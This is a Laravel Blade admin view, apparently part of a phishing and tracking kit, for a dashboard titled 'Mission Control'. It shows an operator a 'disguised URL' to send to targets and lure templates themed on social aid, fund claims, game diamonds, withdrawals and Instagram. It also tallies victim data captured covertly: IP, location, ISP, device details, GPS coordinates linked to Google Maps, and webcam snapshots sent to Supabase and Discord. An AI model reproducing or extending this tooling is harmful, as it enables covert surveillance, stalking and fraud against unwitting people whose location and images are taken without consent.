@extends('layouts.admin')

@section('title', 'Mission Control')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Top Header & Quick Status -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-4 sm:p-5 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo">
        <div>
            <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded-md bg-pastel-lime border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                    LIVE SYSTEM
                </span>
                <h1 class="text-xl sm:text-2xl font-black text-black tracking-tight">Mission Control</h1>
            </div>
            <p class="text-zinc-600 text-xs sm:text-sm mt-1 font-medium">Real-time target telemetry, campaign manager, and captures.</p>
        </div>

        <div class="flex items-center gap-2.5 flex-wrap">
            <div class="flex items-center px-3.5 py-1.5 rounded-xl border-2 border-black text-xs font-bold font-mono shadow-neo-sm {{ $discordConfigured ? 'bg-pastel-green text-black' : 'bg-pastel-orange text-black' }}">
                <span class="w-2.5 h-2.5 rounded-full mr-2 shrink-0 {{ $discordConfigured ? 'bg-black animate-pulse' : 'bg-black' }}"></span>
                Discord: {{ $discordConfigured ? 'CONNECTED' : 'NOT SET' }}
            </div>
            <a href="{{ route('admin.settings') }}" class="px-4 py-2 text-xs font-black bg-pastel-yellow hover:bg-yellow-300 text-black border-2 border-black rounded-xl shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1.5">
                <i class="fa-solid fa-sliders"></i>
                <span>Config</span>
            </a>
        </div>
    </div>

    <!-- Active Target Link Card & Campaign Selector -->
    <div class="p-5 sm:p-6 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo-lg space-y-5">
        <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div class="space-y-1.5">
                <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs uppercase font-mono tracking-wider text-black font-black bg-pastel-orange border border-black px-2 py-0.5 rounded-md shadow-neo-sm">
                        ACTIVE DISGUISED URL
                    </span>
                    <span class="px-2 py-0.5 rounded-md bg-pastel-purple border border-black text-black text-xs font-mono font-bold">
                        Template: {{ $templates[$activeTemplate]['name'] ?? $activeTemplate }}
                    </span>
                </div>
                <p class="text-xs sm:text-sm text-zinc-600 font-medium">Bagikan link utama ini ke target. Sistem telemetri akan berjalan di latar belakang.</p>
            </div>
            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 max-w-xl w-full">
                <input type="text" id="targetLink" readonly value="{{ route('landing') }}" 
                       class="w-full bg-white border-2 border-black rounded-xl px-4 py-2.5 text-xs sm:text-sm text-black font-mono font-bold shadow-neo-sm focus:outline-none select-all truncate">
                <button onclick="copyTargetLink('targetLink', 'copyBtnText')" class="px-5 py-2.5 bg-pastel-lime hover:bg-pastel-limeDark text-black text-xs font-black uppercase tracking-wider rounded-xl border-2 border-black shadow-neo hover:shadow-neo-lg active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition shrink-0 flex items-center justify-center gap-2">
                    <i class="fa-solid fa-copy text-sm"></i>
                    <span id="copyBtnText">Copy Link</span>
                </button>
            </div>
        </div>

        <!-- Template Campaign Links Quick Row -->
        <div class="pt-4 border-t-2 border-dashed border-black/20">
            <span class="text-xs uppercase font-mono tracking-wider text-black font-extrabold block mb-3">
                <i class="fa-solid fa-layer-group text-purple-600 mr-1.5"></i> Quick Template Direct Links:
            </span>
            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-7 gap-2.5">
                @php
                    $pastelBgs = [
                        'gampil' => 'bg-pastel-yellow',
                        'bansos' => 'bg-pastel-purple',
                        'klaim-dana' => 'bg-pastel-orange',
                        'diamond' => 'bg-pastel-lime',
                        'penarikandana' => 'bg-pastel-green',
                        'chatme' => 'bg-pastel-pink',
                        'instagram' => 'bg-[#ffd5ea]',
                    ];
                @endphp
                @foreach($templates as $id => $tpl)
                    <div class="p-3 rounded-xl border-2 border-black {{ $pastelBgs[$id] ?? 'bg-white' }} shadow-neo-sm hover:shadow-neo transition flex flex-col justify-between">
                        <div class="flex items-center justify-between mb-2">
                            <span class="w-7 h-7 rounded-lg bg-black text-white flex items-center justify-center text-xs shadow-neo-sm">
                                <i class="fa-solid {{ $tpl['icon'] }}"></i>
                            </span>
                            <span class="text-[9px] font-mono font-bold bg-white border border-black px-1.5 py-0.5 rounded">
                                {{ $activeTemplate === $id ? 'DEFAULT' : '/p/' . $id }}
                            </span>
                        </div>
                        <div class="text-xs font-extrabold text-black truncate mb-2.5" title="{{ $tpl['name'] }}">{{ $tpl['name'] }}</div>
                        <div class="flex items-center justify-between gap-1 pt-2 border-t border-black/20 text-[10px]">
                            <a href="{{ route('landing.custom', $id) }}" target="_blank" class="p-1 rounded bg-white border border-black text-black hover:bg-black hover:text-white transition">
                                <i class="fa-solid fa-eye"></i>
                            </a>
                            <button onclick="copyDirectUrl('{{ route('landing.custom', $id) }}', this)" class="text-black font-mono font-bold py-1 px-2 rounded bg-white border border-black hover:bg-black hover:text-white transition shadow-neo-sm active:shadow-none">
                                Copy URL
                            </button>
                        </div>
                    </div>
                @endforeach
            </div>
        </div>
    </div>

    <!-- Stats Grid (Neo-Brutalist Big Cards) -->
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-5">
        <!-- Stat 1: Total Visits (Pastel Purple) -->
        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-purple border-[2.5px] border-black shadow-neo-lg relative overflow-hidden flex flex-col justify-between">
            <div class="flex items-center justify-between">
                <div>
                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                        RECONNAISSANCE
                    </span>
                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">Total Visits Logged</p>
                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalLogs) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
                    <i class="fa-solid fa-users"></i>
                </div>
            </div>
            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
                Browser, OS, IP Data
            </div>
        </div>

        <!-- Stat 2: GPS Coordinates (Pastel Orange) -->
        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-orange border-[2.5px] border-black shadow-neo-lg relative overflow-hidden flex flex-col justify-between">
            <div class="flex items-center justify-between">
                <div>
                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                        GEOLOCATION
                    </span>
                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">GPS Coordinates</p>
                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalGps) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
                    <i class="fa-solid fa-location-dot text-red-600"></i>
                </div>
            </div>
            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
                High precision coordinates
            </div>
        </div>

        <!-- Stat 3: Webcam Snapshots (Neon Lime) -->
        <div class="p-5 sm:p-6 rounded-2xl bg-pastel-lime border-[2.5px] border-black shadow-neo-lg relative overflow-hidden sm:col-span-2 lg:col-span-1 flex flex-col justify-between">
            <div class="flex items-center justify-between">
                <div>
                    <span class="px-2 py-0.5 rounded-md bg-white border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                        CAMERA TELEMETRY
                    </span>
                    <p class="text-xs font-extrabold text-black uppercase tracking-wider mt-2">Webcam Snapshots</p>
                    <h3 class="text-3xl sm:text-4xl font-black text-black mt-1">{{ number_format($totalSnapshots) }}</h3>
                </div>
                <div class="w-12 h-12 rounded-2xl bg-white border-2 border-black shadow-neo flex items-center justify-center text-black text-2xl">
                    <i class="fa-solid fa-camera text-purple-600"></i>
                </div>
            </div>
            <div class="mt-4 pt-3 border-t border-black/20 text-xs font-bold text-zinc-700 font-mono">
                Stored in Supabase & Discord
            </div>
        </div>
    </div>

    <!-- Recent Logs (Neo-Brutalist Table & Mobile Card List) -->
    <div class="rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo-lg overflow-hidden">
        <div class="p-4 sm:p-5 border-b-[2.5px] border-black bg-cream-100 flex items-center justify-between">
            <div class="flex items-center space-x-2.5">
                <span class="w-8 h-8 rounded-xl bg-pastel-lime border-2 border-black shadow-neo-sm flex items-center justify-center text-black text-sm">
                    <i class="fa-solid fa-satellite-dish"></i>
                </span>
                <h3 class="font-black text-black text-sm sm:text-base">Recent Target Activity</h3>
            </div>
            <a href="{{ route('admin.logs') }}" class="px-3 py-1.5 bg-white hover:bg-pastel-purple text-black font-extrabold text-xs rounded-xl border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1">
                <span>View All Logs</span> &rarr;
            </a>
        </div>

        @if($recentLogs->isEmpty())
            <div class="p-10 sm:p-12 text-center text-zinc-500">
                <i class="fa-solid fa-radar text-4xl mb-3 text-black"></i>
                <h4 class="font-bold text-black text-base">Belum Ada Aktivitas Terdeteksi</h4>
                <p class="text-xs text-zinc-600 mt-1 max-w-sm mx-auto font-medium">Bagikan link landing page ke target untuk mulai mengumpulkan data telemetri.</p>
            </div>
        @else
            <!-- Desktop Table View (Hidden on mobile) -->
            <div class="hidden md:block overflow-x-auto scrollbar-slim touch-scroll">
                <table class="w-full text-left text-xs">
                    <thead class="bg-cream-300 text-black uppercase font-mono text-[11px] font-bold tracking-wider border-b-2 border-black">
                        <tr>
                            <th class="p-4">Target IP / Location</th>
                            <th class="p-4">Device / OS</th>
                            <th class="p-4">GPS Status</th>
                            <th class="p-4">Photos</th>
                            <th class="p-4">Captured At</th>
                            <th class="p-4 text-right">Action</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y-2 divide-black/10 text-zinc-800 font-medium">
                        @foreach($recentLogs as $log)
                            <tr class="hover:bg-pastel-yellow/30 transition">
                                <td class="p-4 font-mono">
                                    <div class="font-bold text-black text-sm">{{ $log->ip }}</div>
                                    <div class="text-xs text-zinc-600 font-bold">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                    @if($log->isp)
                                        <div class="text-[10px] text-zinc-500 truncate max-w-xs font-normal">{{ $log->isp }}</div>
                                    @endif
                                </td>
                                <td class="p-4">
                                    <div class="font-bold text-black">{{ $log->platform ?? 'Unknown' }}</div>
                                    <div class="text-[11px] text-zinc-600 truncate max-w-xs font-mono">{{ $log->screen_resolution ?? 'Screen: N/A' }} • RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }}</div>
                                </td>
                                <td class="p-4">
                                    @if($log->gps_lat && $log->gps_lon)
                                        <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
                                           class="inline-flex items-center px-3 py-1 rounded-lg bg-pastel-orange border border-black text-black font-bold text-xs shadow-neo-sm hover:shadow-none active:translate-x-0.5 active:translate-y-0.5 transition">
                                            <i class="fa-solid fa-map-location-dot mr-1.5 text-red-600"></i> Maps
                                        </a>
                                    @elseif($log->gps_error)
                                        <span class="inline-flex items-center px-2.5 py-0.5 rounded-md text-[10px] font-bold font-mono bg-pastel-pink text-black border border-black shadow-neo-sm">
                                            Denied
                                        </span>
                                    @else
                                        <span class="text-zinc-500 font-mono text-[11px]">Pending</span>
                                    @endif
                                </td>
                                <td class="p-4">
                                    @if($log->snapshots->isNotEmpty())
                                        <span class="inline-flex items-center px-2.5 py-1 rounded-lg bg-pastel-lime border border-black text-black font-bold text-xs font-mono shadow-neo-sm">
                                            <i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps
                                        </span>
                                    @else
                                        <span class="text-zinc-400 font-mono">-</span>
                                    @endif
                                </td>
                                <td class="p-4 font-mono text-zinc-600 text-xs">
                                    {{ $log->created_at->diffForHumans() }}
                                </td>
                                <td class="p-4 text-right">
                                    <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-3.5 py-1.5 text-xs font-black bg-white hover:bg-pastel-purple text-black rounded-lg border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition">
                                        Details &rarr;
                                    </a>
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>

            <!-- Mobile Card View (Neo-Brutalism for Mobile) -->
            <div class="md:hidden divide-y-2 divide-black/10 p-3 space-y-3">
                @foreach($recentLogs as $log)
                    <div class="p-4 rounded-xl bg-white border-2 border-black shadow-neo-sm space-y-3">
                        <div class="flex items-start justify-between gap-2">
                            <div>
                                <span class="font-black text-black font-mono text-sm block">{{ $log->ip }}</span>
                                <div class="text-xs font-bold text-zinc-600">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                            </div>
                            <span class="text-[10px] text-zinc-600 font-mono font-bold bg-cream-300 px-2 py-0.5 rounded border border-black">{{ $log->created_at->diffForHumans() }}</span>
                        </div>

                        <div class="text-xs text-zinc-700 flex items-center justify-between pt-1">
                            <span class="font-bold"><i class="fa-solid fa-laptop text-black mr-1"></i> {{ $log->platform ?? 'Unknown OS' }}</span>
                            @if($log->snapshots->isNotEmpty())
                                <span class="bg-pastel-lime border border-black px-2 py-0.5 rounded font-mono font-bold text-[10px] shadow-neo-sm"><i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }} snaps</span>
                            @endif
                        </div>

                        <div class="flex items-center justify-between pt-2 border-t border-black/10 text-xs">
                            @if($log->gps_lat && $log->gps_lon)
                                <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
                                   class="px-2.5 py-1 bg-pastel-orange border border-black rounded-lg text-black font-bold flex items-center gap-1 shadow-neo-sm">
                                    <i class="fa-solid fa-map-location-dot text-red-600"></i> Maps
                                </a>
                            @else
                                <span class="text-zinc-500 font-mono text-[11px]">GPS: {{ $log->gps_error ? 'Denied' : 'None' }}</span>
                            @endif

                            <a href="{{ route('admin.logs', ['search' => $log->ip]) }}" class="px-3.5 py-1 bg-pastel-purple hover:bg-purple-300 text-black border border-black rounded-lg text-xs font-bold shadow-neo-sm">
                                Details &rarr;
                            </a>
                        </div>
                    </div>
                @endforeach
            </div>
        @endif
    </div>

</div>

<script>
function copyTargetLink(inputId, btnTextId) {
    const input = document.getElementById(inputId);
    input.select();
    input.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(input.value);
    
    const btnText = document.getElementById(btnTextId);
    btnText.innerText = 'Copied!';
    setTimeout(() => {
        btnText.innerText = 'Copy Link';
    }, 2000);
}

function copyDirectUrl(url, btn) {
    navigator.clipboard.writeText(url).then(() => {
        const orig = btn.innerText;
        btn.innerText = 'Copied!';
        setTimeout(() => {
            btn.innerText = orig;
        }, 1800);
    });
}
</script>
@endsection
